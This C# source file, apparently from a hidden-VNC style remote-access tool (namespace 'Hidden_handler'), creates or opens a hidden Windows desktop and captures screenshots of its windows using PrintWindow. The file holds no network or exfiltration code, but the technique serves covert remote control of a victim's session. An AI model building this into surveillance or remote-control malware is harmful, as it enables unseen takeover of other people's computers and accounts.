using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Hidden_handler
{
    class Imaging_handler : IDisposable
    {
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }

        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private enum GetWindowType : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowType uCmd);

        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        private enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }

        public IntPtr Desktop { get; private set; }

        public Imaging_handler(string DesktopName)
        {
            IntPtr Desk = OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (Desk == IntPtr.Zero)
            {
                Desk = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            Desktop = Desk;
        }

        private static float GetScalingFactor()
        {
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr desktop = graphics.GetHdc();
                int logicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
                int physicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
                float scalingFactor = (float)physicalScreenHeight / logicalScreenHeight;
                return scalingFactor;
            }
        }

        private bool DrawApplication(IntPtr hWnd, Graphics modifiableScreen, IntPtr DC)
        {
            RECT r;
            bool returnValue = false;
            GetWindowRect(hWnd, out r);

            float scalingFactor = GetScalingFactor();
            IntPtr hDcWindow = CreateCompatibleDC(DC);
            IntPtr hBmpWindow = CreateCompatibleBitmap(DC, (int)((r.Right - r.Left) * scalingFactor), (int)((r.Bottom - r.Top) * scalingFactor));

            SelectObject(hDcWindow, hBmpWindow);
            uint nflag = 2; // 0, in Windows below 8.1 this way not work and needs to be 0
            if (PrintWindow(hWnd, hDcWindow, nflag))
            {
                try
                {
                    Bitmap processImage = Bitmap.FromHbitmap(hBmpWindow);
                    modifiableScreen.DrawImage(processImage, new Point(r.Left, r.Top));
                    processImage.Dispose();
                    returnValue = true;
                }
                catch
                {

                }
            }
            DeleteObject(hBmpWindow);
            DeleteDC(hDcWindow);
            return returnValue;
        }

        private void DrawTopDown(IntPtr owner, Graphics modifiableScreen, IntPtr DC)
        {
            IntPtr currentWindow = GetTopWindow(owner);
            if (currentWindow == IntPtr.Zero)
            {
                return;
            }
            currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDLAST);
            if (currentWindow == IntPtr.Zero)
            {
                return;
            }
            while (currentWindow != IntPtr.Zero)
            {
                DrawHwnd(currentWindow, modifiableScreen, DC);
                currentWindow = GetWindow(currentWindow, GetWindowType.GW_HWNDPREV);
            }
        }

        private void DrawHwnd(IntPtr hWnd, Graphics modifiableScreen, IntPtr DC)
        {
            if (IsWindowVisible(hWnd))
            {
                DrawApplication(hWnd, modifiableScreen, DC);
                if (Environment.OSVersion.Version.Major < 6)
                {
                    DrawTopDown(hWnd, modifiableScreen, DC);
                }
            }
        }

        public void Dispose()
        {
            CloseDesktop(Desktop);
            GC.Collect();
        }

        public Bitmap Screenshot()
        {
            SetThreadDesktop(Desktop);
            IntPtr DC = GetDC(IntPtr.Zero);
            RECT DesktopSize;
            GetWindowRect(GetDesktopWindow(), out DesktopSize);
            float scalingFactor = GetScalingFactor();
            Bitmap Screen = new Bitmap((int)(DesktopSize.Right * scalingFactor), (int)(DesktopSize.Bottom * scalingFactor));
            using (Graphics modifiableScreen = Graphics.FromImage(Screen))
            {
                DrawTopDown(IntPtr.Zero, modifiableScreen, DC);
            }
            ReleaseDC(IntPtr.Zero, DC);
            return Screen;
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
            IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetThreadDesktop(IntPtr hDesktop);
    }
}
